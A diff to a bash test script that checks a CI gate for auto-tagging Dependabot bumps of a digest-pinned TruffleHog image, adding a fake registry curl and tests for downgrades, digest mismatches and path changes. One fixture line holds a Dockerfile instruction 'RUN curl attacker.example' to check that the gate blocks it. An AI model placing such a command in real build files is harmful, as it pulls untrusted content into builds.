@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
-# Tests .github/scripts/next-auto-tag.sh against throwaway git repositories.
+# Tests .github/scripts/next-auto-tag.sh against throwaway git repositories and
+# a fake curl that stands in for ghcr.io.
 set -uo pipefail
 
 cd "$(dirname "$0")/.." || exit 1
@@ -7,11 +8,66 @@ script=$PWD/.github/scripts/next-auto-tag.sh
 failures=0
 tmp=$(mktemp -d /tmp/next-auto-tag.XXXXXX)
 trap 'rm -rf "$tmp"' EXIT
+mkdir "$tmp/bin"
+
+# digest_of <version>: the digest that the fake registry serves for a version.
+digest_of() {
+  printf 'sha256:%064d' "${1//./}"
+}
+
+# pin <version> [digest]: a Dockerfile line that pins the version, by default
+# to the digest that the fake registry serves for it.
+pin() {
+  echo "FROM ghcr.io/trufflesecurity/trufflehog:$1@${2:-$(digest_of "$1")}"
+}
+
+# The fake curl hands out a token and answers manifest requests that carry it
+# with digest_of <tag>, but only when the Accept header lists the Docker
+# manifest list type, as ghcr.io serves the TruffleHog tags. FAKE_CURL_FAIL=token
+# or manifest makes that request fail.
+cat > "$tmp/bin/curl" <<CURL
+#!/usr/bin/env bash
+$(declare -f digest_of)
+CURL
+cat >> "$tmp/bin/curl" <<'CURL'
+args=" $* "
+fail() {
+  echo "curl: (22) The requested URL returned error: $1" >&2
+  exit 22
+}
+case $args in
+  *' --fail '*) ;;
+  *) echo 'fake curl: missing --fail' >&2; exit 2 ;;
+esac
+case $args in
+  *' https://ghcr.io/token?scope=repository:trufflesecurity/trufflehog:pull '*)
+    [ "${FAKE_CURL_FAIL:-}" != token ] || fail 503
+    echo '{"token":"fake-token"}'
+    ;;
+  *' https://ghcr.io/v2/trufflesecurity/trufflehog/manifests/'*)
+    [ "${FAKE_CURL_FAIL:-}" != manifest ] || fail 503
+    [[ $args == *'Authorization: Bearer fake-token'* ]] || fail 401
+    tag=${args##*/manifests/}
+    tag=${tag%% *}
+    if [[ $args == *application/vnd.docker.distribution.manifest.list.v2+json* ]]; then
+      digest=$(digest_of "$tag")
+    else
+      digest=sha256:$(printf '%064d' 1)
+    fi
+    printf 'HTTP/2 200\r\ncontent-type: application/vnd.docker.distribution.manifest.list.v2+json\r\ndocker-content-digest: %s\r\n\r\n' "$digest"
+    ;;
+  *) echo "fake curl: unexpected request: $*" >&2; exit 2 ;;
+esac
+CURL
+chmod +x "$tmp/bin/curl"
 
 bot_name='dependabot[bot]'
 bot_email='49699333+dependabot[bot]@users.noreply.github.com'
+# Numbers the TruffleHog versions that commit_as pins, so each one is newer.
+serial=0
 
-# new_repo <name>: creates a repository whose first commit, by a person, is tagged v1.1.5.
+# new_repo <name>: creates a repository whose first commit, by a person, is
+# tagged v1.1.5 and pins TruffleHog 3.99.<serial>, or $image when a test sets it.
 new_repo() {
   repo=$tmp/$1
   git init -q -b main "$repo"
@@ -30,8 +86,9 @@ commit_as() {
   for path in "$@"; do
     mkdir -p "$repo/$(dirname "$path")"
     if [ "$path" = trufflehog/Dockerfile ]; then
-      # A new pinned image each time, or $image when a test sets it.
-      echo "${image:-FROM ghcr.io/trufflesecurity/trufflehog:3.99.$RANDOM@sha256:$(printf '%064d' "$RANDOM")}" > "$repo/$path"
+      # A newer pinned image each time, or $image when a test sets it.
+      serial=$((serial + 1))
+      echo "${image:-$(pin "3.99.$serial")}" > "$repo/$path"
     else
       echo "$RANDOM" >> "$repo/$path"
     fi
@@ -49,7 +106,7 @@ bot_commit() {
 expect() {
   local name=$1 want=$2 want_out=$3
   local out got
-  if out=$(cd "$repo" && "$script" 2>/dev/null); then
+  if out=$(cd "$repo" && PATH="$tmp/bin:$PATH" "$script" 2>/dev/null); then
     got=tag
   else
     got=block
@@ -77,6 +134,10 @@ bot_commit tests/a.sh
 bot_commit docs/a.md
 expect tags_with_allowed_paths tag v1.1.6
 
+new_repo workflow_change
+bot_commit trufflehog/Dockerfile .github/workflows/test.yml .github/dependabot.yml
+expect allows_workflow_change tag v1.1.6
+
 new_repo without_tag
 git -C "$repo" tag -d v1.1.5 >/dev/null
 bot_commit trufflehog/Dockerfile
@@ -101,6 +162,14 @@ new_repo lookalike_paths
 bot_commit trufflehog/Dockerfile .github-extra/x docs.md
 expect blocks_lookalike_paths block 'Changed outside the allowed paths since v1.1.5: .github-extra/x docs.md'
 
+new_repo gate_script_change
+bot_commit trufflehog/Dockerfile .github/scripts/next-auto-tag.sh
+expect blocks_gate_script_change block 'Changed outside the allowed paths since v1.1.5: .github/scripts/next-auto-tag.sh'
+
+new_repo other_github_paths
+bot_commit trufflehog/Dockerfile .github/CODEOWNERS .github/actions/x/action.yml
+expect blocks_other_github_paths block 'Changed outside the allowed paths since v1.1.5: .github/CODEOWNERS .github/actions/x/action.yml'
+
 new_repo rename_out_of_action
 commit_as 'Repo Owner' 'owner@example.com' dependabot-review/run.sh
 git -C "$repo" tag -f v1.1.5 >/dev/null
@@ -116,6 +185,35 @@ expect blocks_foreign_image block 'trufflehog/Dockerfile does not pin a ghcr.io/
 new_repo extra_dockerfile_line
 image=$'FROM ghcr.io/trufflesecurity/trufflehog:3.99.8@sha256:0000000000000000000000000000000000000000000000000000000000000000\nRUN curl attacker.example' bot_commit trufflehog/Dockerfile
 expect blocks_extra_dockerfile_line block 'trufflehog/Dockerfile does not pin a ghcr.io/trufflesecurity/trufflehog version by digest'
+
+image=$(pin 3.99.5) new_repo downgrade
+image=$(pin 3.99.4) bot_commit trufflehog/Dockerfile
+expect blocks_downgrade block 'TruffleHog 3.99.4 in trufflehog/Dockerfile is not newer than 3.99.5 in v1.1.5'
+
+image=$(pin 3.99.5) new_repo same_version
+image=$(pin 3.99.5 "sha256:$(printf '%064d' 7)") bot_commit trufflehog/Dockerfile
+expect blocks_same_version_new_digest block 'TruffleHog 3.99.5 in trufflehog/Dockerfile is not newer than 3.99.5 in v1.1.5'
+
+image=$(pin 3.99.9) new_repo numeric_versions
+image=$(pin 3.99.10) bot_commit trufflehog/Dockerfile
+expect compares_versions_numerically tag v1.1.6
+
+image=$(pin 3.9.5) new_repo minor_version
+image=$(pin 3.10.0) bot_commit trufflehog/Dockerfile
+expect allows_minor_update tag v1.1.6
+
+image='FROM ghcr.io/trufflesecurity/trufflehog:latest' new_repo unpinned_at_tag
+bot_commit trufflehog/Dockerfile
+expect blocks_unpinned_image_at_tag block 'trufflehog/Dockerfile in v1.1.5 does not pin a ghcr.io/trufflesecurity/trufflehog version by digest'
+
+image=$(pin 3.99.5) new_repo digest_mismatch
+image=$(pin 3.99.6 "sha256:$(printf '%064d' 7)") bot_commit trufflehog/Dockerfile
+expect blocks_digest_mismatch block "ghcr.io serves $(digest_of 3.99.6) for trufflehog:3.99.6, but trufflehog/Dockerfile pins sha256:$(printf '%064d' 7)"
+
+new_repo registry_error
+bot_commit trufflehog/Dockerfile
+FAKE_CURL_FAIL=token expect blocks_token_error block "Could not get the digest of trufflehog:3.99.$serial from ghcr.io"
+FAKE_CURL_FAIL=manifest expect blocks_registry_error block "Could not get the digest of trufflehog:3.99.$serial from ghcr.io"
 
 new_repo mixed_authors
 bot_commit trufflehog/Dockerfile
@@ -151,7 +249,7 @@ new_repo long_reason
 files=()
 for i in $(seq 1 100); do files+=("src/file-with-a-long-name-$i.txt"); done
 bot_commit trufflehog/Dockerfile "${files[@]}"
-out=$(cd "$repo" && "$script" 2>/dev/null)
+out=$(cd "$repo" && PATH="$tmp/bin:$PATH" "$script" 2>/dev/null)
 if [ "${#out}" -le 500 ] && [[ "$out" == "Changed outside the allowed paths since v1.1.5: "* ]]; then
   echo "ok   $name"
 else
